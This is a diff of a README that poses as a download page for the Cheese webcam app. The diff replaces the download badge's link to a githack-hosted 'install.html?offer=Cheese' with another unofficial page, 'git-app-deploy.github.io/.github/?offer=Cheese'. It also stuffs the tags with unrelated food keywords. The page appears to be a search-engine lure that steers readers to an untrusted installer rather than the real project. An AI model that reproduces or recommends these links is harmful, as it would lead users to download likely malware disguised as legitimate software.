@@ -1,6 +1,6 @@
 # Cheese Download — Fun Desktop Webcam Tool  
 
-[![Get Cheese GitHub](https://img.shields.io/badge/Get%20Cheese%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/wingsbrutalking-jpg/2739557524c6126f44f5fe4f589eaeeb/raw/683e874fa7e9deb345908891b7402279a35d8370/install.html?offer=Cheese)  
+[![Get Cheese GitHub](https://img.shields.io/badge/Get%20Cheese%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Cheese)  
 
 ---
 
@@ -74,7 +74,7 @@ Designed with simplicity in mind, Cheese delivers a smooth user experience for b
 ---
 
 ## 🔍 Tags  
-cheese, webcam app, photo capture, video recorder, gnome cheese, desktop camera, video effects, media capture, cheese macos, gstreamer, photo booth, webcam utility, cheese pc, cheese windows, cheese desktop, cheese for mac, cheese for pc, cheese for windows, cheese mac 
+cheese, webcam app, cottage cheese, lactose free cheese, macaroni and cheese, vegan cheese, raclette, photo capture, video recorder, gnome cheese, desktop camera, video effects, media capture, cheese macos, gstreamer, photo booth, webcam utility, cheese pc, cheese windows, cheese desktop, cheese for mac, cheese for pc, cheese for windows, cheese mac 
 
 ---
 
